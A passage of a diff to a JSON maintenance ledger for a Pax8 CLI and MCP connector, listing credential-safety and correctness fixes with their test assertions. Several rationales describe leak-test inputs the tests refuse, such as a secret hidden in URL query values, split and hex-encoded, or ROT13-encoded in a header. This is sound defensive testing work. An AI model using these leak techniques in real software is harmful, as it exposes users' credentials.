4.34.2 reprint: the shipped `auth login` minted without the audience, so the token it saved was unusable; both mint paths now build their body with client.ClientCredentialsTokenForm (token-request-body-credentials).",
    "status": "active",
    "spec_encode_followup": "Press fix: an OAuth audience on the client-credentials security scheme (an x-auth-audience style extension with an env override) rendered into the token form by client.go.tmpl.",
    "asserts": [
@@ -807,11 +457,521 @@
      "contains": "form.Set(\"audience\", aud)",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "form := client.ClientCredentialsTokenForm(clientID, clientSecret)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "secret-echo",
+   "summary": "The on-disk response cache is off on every client: raw Pax8 bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (pax8_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to pax8 from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to pax8 from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Pax8 state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/pax8_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to pax8 from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to pax8 from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/pax8_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/pax8_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to pax8 from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "partner-endpoints-pp-cli/config.toml"
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "Each credential goes only to the host it is bound to: the bearer token and every API request to the origin of PAX8_BASE_URL; the client ID and secret only to the API base URL's origin or Pax8's token manager (https://token-manager.pax8.com, the kit's Origins, so a PAX8_TOKEN_URL on any other host is refused before anything is sent), whose origin receives nothing but a POST to that exact path with no Authorization header; every redirect hop stays on the origin of the request it follows. The `auth login` token client is pinned to the token URL alone.",
+   "why": "Work order credential rule (host pinning): the client sends a credential only to the configured scheme, host and port and refuses every redirect or request to anything else. Press 4.34.2 has its own redirect and dial guards, but nothing that binds the client secret to the token host or the bearer token to the API host, and the automatic mint reuses the API client's transport. Applied through registerClientHook (hand file pax8_guard.go; regen-durable) plus one anchored line in the generated root.go oauthHTTPClient for the `auth login` client, which the hooks never reach. Proved by tests that fail with each rule removed (seen/token-host-pin, seen/redirect-origin).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "func (p pax8Pins) check(req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "req.Method == http.MethodPost && req.URL.EscapedPath() == p.tokenPath && req.Header.Get(\"Authorization\") == \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "normalizedOrigin(req.URL) != normalizedOrigin(via[0].URL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "func guardTokenClient(hc *http.Client, cfg *config.Config, dryRun bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "guardTokenClient(hc, cfg, f.dryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_cred_rules_test.go",
+     "contains": "func TestPinsAllowOnlyTheTokenRequestOnTheTokenHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_cred_rules_test.go",
+     "contains": "func TestRedirectStaysOnItsOwnOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_cred_rules_test.go",
+     "contains": "func TestOriginPinKeepsEachCredentialOnItsHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_cred_rules_test.go",
+     "contains": "func TestAuthLoginMintIsPinnedAndHeld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestRedirectNeverReachesAnotherHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestClientPairNeverLeavesForAnotherTokenHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "class": "write-safety",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Pax8 whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pax8_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "class": "write-safety",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/pax8_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Pax8: no write without confirm, the string \"true\" previews, and boolean true sends (control).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/pax8_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/pax8_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-request-body-credentials",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "One client_credentials token body for both mint paths (client.ClientCredentialsTokenForm): grant_type, client_id, client_secret and audience in the form body (client_secret_post), optional scope; no HTTP Basic header.",
+   "why": "Pax8's token manager documents the client credentials and the audience in the request body (research brief: POST https://token-manager.pax8.com/oauth/token with grant_type, client_id, client_secret, audience); the published connector sent them that way. Press 4.34.2 moved the credentials to HTTP Basic and builds the form in two places, one of which (`auth login`) never carried the audience. A reprint re-renders both mint functions, so tools/apply_edits.py re-points them at the one builder. TestMintSendsPax8TokenForm failed on the generated code (Basic header, empty client_id/client_secret/audience).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func ClientCredentialsTokenForm(clientID, clientSecret string) url.Values {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "\"client_secret\": {clientSecret},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "form := ClientCredentialsTokenForm(clientID, clientSecret)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "form := client.ClientCredentialsTokenForm(clientID, clientSecret)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "req.SetBasicAuth(clientID, clientSecret)"
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "req.SetBasicAuth(clientID, clientSecret)"
+    },
+    {
+     "file": "cli/internal/client/pax8_token_form_test.go",
+     "contains": "func TestMintSendsPax8TokenForm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rejected-mint-returns",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "A rejected client-credentials mint returns its error instead of hanging: the generated mint builds its error from the token endpoint's body with cliutil.SanitizeErrorBody, which takes no token-state lock, and the credential kit withholds any repeat of the secret at the sink. mint_lock_scan.py exits 0 on internal/client.",
+   "why": "The exchange runs with the token-state lock held and maskCredentialText takes the same non-reentrant lock, so the funnel's masked token-error body deadlocked every rejected mint (jamf-pro and threecx 2026-10-27; ~/printing-press/fleet/bin/mint_lock_scan.py exit 1 on this tree). TestRejectedMintReturnsWithoutTheSecret hung 15 s on the generated code (cold mint and 401 re-mint) and passes now; mint_lock_scan exit 0. The hand wrapper (mintClientCredentialsRaw, shownTokenErrorBody) went with the connector's funnel when the shared credential kit replaced it (credkit-wiring): with no masking under the lock there is nothing to re-enter.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) mintClientCredentials(ctx context.Context, clientID, clientSecret string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "c.shownErrorBody(body, clientID, clientSecret)"
+    },
+    {
+     "file": "cli/internal/client/pax8_token_errors_test.go",
+     "contains": "func TestRejectedMintReturnsWithoutTheSecret(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-pax8-root-not-placeholder",
+   "class": "doctor-truth",
+   "status": "active",
+   "summary": "doctor treats Pax8's real API root (https://api.pax8.com/v1, the shipped default) as configured and probes the credential, instead of reporting the shipped placeholder on every healthy install.",
+   "why": "press-traps section 5: doctorShippedBaseURL held a real single-endpoint vendor host (api.pax8.com was named in the fleet sweep), so doctor printed \"ERROR base_url is still the shipped placeholder\" and skipped the credential probe on every correctly configured install. The doctor-verdict replay restores doctor_verdict.go only when the reprint lacks it, so this edit survives onboard; a fleet re-mint of the doctor template would restore the placeholder value and fail this assert.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_pax8_root_test.go",
+     "contains": "func TestDoctorTreatsThePax8APIRootAsReal(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-json-empty-is-array",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "On an empty store every list the novel commands print under --json (since, overage, reconcile's two finding lists) is [], never null.",
+   "why": "press-traps section 3 (nil slices marshal as [], not null): an agent reads null as \"no data was produced\" rather than \"nothing matched\". The shipped novels declared the lists with var. TestNovelJSONListsAreArraysOnAnEmptyStore failed with one reverted (seen/novel-json-null).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "changes := []subChange{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/overage.go",
+     "contains": "flagged := []overageRow{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcendence_helpers.go",
+     "contains": "out := []map[string]any{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "BilledWithoutActiveSubscription: []reconcileFinding{}, ActiveWithoutInvoice: []reconcileFinding{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_json_test.go",
+     "contains": "func TestNovelJSONListsAreArraysOnAnEmptyStore(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "company-show-literal-registration",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "The `company` novel and its `company show` leaf register with literal AddCommand, as the shipped tree did.",
+   "why": "press-traps section 3: dogfood's command walk follows only .AddCommand, so through 4.34.2's addNovelCommandIfAbsent the leaf `show` false-matched `profile show` and dogfood reported a command-depth mismatch. tools/apply_edits.py re-applies both lines after a render.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/company.go",
+     "contains": "cmd.AddCommand(newNovelCompanyShowCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newNovelCompanyCmd(flags))",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "config.toml never holds a credential. It is a credential source, written outside the shared credential kit (a declared exemption, credkit-wiring), so every value it keeps passes persistedWithoutCredentials: base_url and token_url lose their userinfo, query and fragment, so a secret split across two query values goes with them; a [headers] value the kit would refuse to send to the API origin (credkit.Transport over a transport that sends nothing), which carries a credential bound elsewhere in any encoding the kit reads, ROT13 included, is left out.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `PAX8_BASE_URL='https://api.pax8.com/v1?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand file internal/config/pax8_persist.go; three anchored lines in the generated config.go (tools/apply_credential_rules.py). TestConfigFileNeverHoldsACredential failed on the generated save (seen/r1-config-file-credential-seen-failing.log). Codex r2 class credential-persisted-outside-the-store, two failing inputs: PAX8_BASE_URL=https://api.pax8.com/v1?a=<first 12>&b=<last 12> with PAX8_CLIENT_SECRET=<the 24-character secret>, and the ROT13 of that secret in a config [headers] value. kit_r2_test.go TestKitConfigFileRefusesSplitQueryValues and TestKitConfigFileRefusesEncodedHeaderCredential run the built binary; seen failing with the filter off.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persist = persistedWithoutCredentials(persisted.persisted())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/pax8_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig) persistedConfig {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/pax8_persist.go",
+     "contains": "func urlWithoutCredentials(field, raw, fallback string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/pax8_persist.go",
+     "contains": "credkit.Transport(noSend{}).RoundTrip(req)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/pax8_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/kit_r2_test.go",
+     "contains": "func TestKitConfigFileRefusesSplitQueryValues(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/kit_r2_test.go",
+     "contains": "func TestKitConfigFileRefusesEncodedHeaderCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-documented-shapes",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "The novels share one reading of each documented Pax8 shape (internal/cli/pax8_novel_rules.go): Subscription.status classified over the whole enum (Active, Activated, Trial bill; unknown statuses never count and are reported); Subscription.billingTerm (MRR is Monthly only; Annual, 2-Year, 3-Year reported beside it per term; One-Time, Activation, Trial excluded); one timestamp parser (numeric offsets with or without a colon; an unreadable date is never in a window); every collection read under the names sync and live reads store it as (usage summaries are the subscriptions_usage_summaries dependent); reconcile joins invoice lines to subscriptions by subscriptionId (a line for a period before a non-billing subscription ended is history; free trials, and in --draft mode non-monthly terms, are not expected on an invoice). After the Codex stop rule (unreviewed): a record stored under two names is read once, newest row first; a trial priced above zero bills; credit lines (InvoiceItem.type rebate, payment-credit, service-credit, invoice-credit, or a negative total) neither bill nor count as billed.",
+   "why": "Codex r1 wrong-result classes on documented shapes (spec.json Subscription.billingTerm and status, examples/subscription-history, UsageSummary as a subscription dependent, InvoiceItem.subscriptionId): One-Time charges counted as MRR; Activated subscriptions dropped; overage and company show read usage_summaries while sync writes subscriptions_usage_summaries (carried from 0.1.8); since dropped -0700 timestamps and kept unreadable ones; reconcile joined per company, so one invoice hid every other subscription's mismatch. Each test in internal/cli/pax8_novel_results_test.go failed before (seen/r1-billing-term, r1-billing-status, r1-unsynced-collection, r1-timestamp-format, r1-company-level-join, r1b-reconcile-expected-lines, r1b-reconcile-line-periods).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8SubscriptionBills(status string) (bills, known bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8BillingTermClass(term string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8ParseTime(s string) (time.Time, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "pax8UsageSummaries = []string{\"subscriptions_usage_summaries\", \"usage-summaries\", \"usage_summaries\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "switch pax8BillingTermClass(term) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/overage.go",
+     "contains": "summaries, err := pax8Collection(db, pax8UsageSummaries)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "if t, ok := parseAnyDate(dateStr); !ok || t.Before(cutoff) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "sid := pax8FieldStr(line, \"subscriptionId\", \"subscription_id\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "if !pax8ExpectsInvoiceLine(s, draft) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8LineBeforeEnd(line, sub map[string]any) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_results_test.go",
+     "contains": "func TestReconcileReadsLinePeriodsAgainstTheSubscriptionEnd(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_results_test.go",
+     "contains": "func TestReconcileExpectsLinesOnlyWhereAnInvoiceCarriesThem(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "if prev := out[i]; s.updated > prev.updated || (s.updated == prev.updated && s.seq > prev.seq) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "if price, ok := pax8FieldNum(sub, \"price\"); !ok || price <= 0 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_rules.go",
+     "contains": "func pax8LineIsCharge(line map[string]any) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "if !pax8LineIsCharge(line) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_r2_novel_test.go",
+     "contains": "func TestR2NewerUsageSummaryWins(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_r2_novel_test.go",
+     "contains": "func TestR2PaidTrialWithoutLineIsUnbilled(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_r2_novel_test.go",
+     "contains": "func TestR2CreditLineIsNotBilling(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_r2_novel_test.go",
+     "contains": "func TestR2CreditOnlyLineDoesNotCountAsBilled(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/company_show.go",
+     "contains": "*part.dst = pax8Where(rows, companyID, part.keys...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_results_test.go",
+     "contains": "func TestReconcileJoinsInvoiceLinesBySubscription(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pax8_novel_results_test.go",
+     "contains": "func TestEveryNovelCollectionIsOneSyncWrites(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
   {
    "id": "chatgpt-desktop-local-web-unsupported",
+   "class": "docs",
    "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
    "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
    "status": "active",
@@ -864,6 +1024,547 @@
    ]
   },
   {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal (SecretEnv PAX8_CLIENT_ID, PAX8_CLIENT_SECRET, PAX8_COOKIE and PAX8_MCP_HTTP_TOKEN; URLEnv PAX8_TOKEN_URL and PAX8_FEEDBACK_ENDPOINT; Files = the config the run really uses first, then the 0600 credential store and the legacy config, with every other config, store and profiles.json any --config or --home could mean held through cliutil.HoldFile (a profile store through cliutil.HoldProfileFile); CredentialFlags --client-id and --client-secret; StdinFlags --stdin; ResponseFields access_token, refresh_token and id_token; BaseURL PAX8_BASE_URL, default https://api.pax8.com/v1; Origins the base URL for everything, the base URL and Pax8's token manager for the client pair, nowhere for the cookie and the MCP HTTP token). credkit.Start is the first statement of both mains and credkit.Exit ends them. Every sink is routed: stdout and stderr at the descriptor; the API client (client.OutboundGuard, under the origin pin in pax8_guard.go), feedback, deliver and the probe through credkit.Transport; cache, journal, teach log, learnings audit, profile, platform profile, rate-limit lock, download and export files through credkit.WriteFile, AppendFile, OpenFile and NewWriter; SQLite through internal/credsql (credkit.SQLDriver, the MCP sql value cap set as each connection opens); the MCP server through MCPTools, MCPIn, MCPOut and MCPHTTP; the MCP server's CLI child through RunCommand; terminal checks through credkit.Terminal; auth set-token holds the token it reads from stdin, and a minted token is held where it is minted. The 0600 credential store and config.toml are credential sources: their writes are a declared exemption, outside the kit in cliutil.AtomicWriteCredentialFile, and both are in Files.",
+   "why": "Retires secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, response-credentials-held, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). The connector's own holder, output chokepoint, secret funnel, encodings table and outbound checks kept growing per review round because each sink and encoding was closed one at a time; the kit is one shared implementation of the leak contract, checked byte for byte against tools/maintainer/credkit (vendor_credkit.py --check). It closes the classes Codex r2 left open, each kept with its failing input in internal/pax8blackbox/kit_r2_test.go against the built binary: a partly escaped secret mixed with plain text in output, hex of each half of the secret in two query values of feedback --send (reaches the server 0 times), and one value of PAX8_COOKIE printed on its own. Seen failing logs: .review/seen/kit-*-seen-failing.log.",
+   "spec_encode_followup": "Press-side: generate the Declarations literal and route every sink through the kit, as the press's own credential layer, so a reprint carries the wiring by construction.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func credentialFiles(args []string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)\n\tcredkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/pax8-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cliutil.Hold(\"minted:access_token\", tok.AccessToken)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/sinks_test.go",
+     "contains": "func TestEveryNetworkSendPassesTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/writers_test.go",
+     "contains": "func TestEveryFileWritePassesTheKit(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/kit_r2_test.go",
+     "contains": "func TestKitEncodedOutputMixedWithPlainTextIsWithheld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/kit_r2_test.go",
+     "contains": "func TestKitFeedbackSendRefusesHexEncodedHalves(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/pax8blackbox/kit_r2_test.go",
+     "contains": "func TestKitEnvironmentCookieValuesHeld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
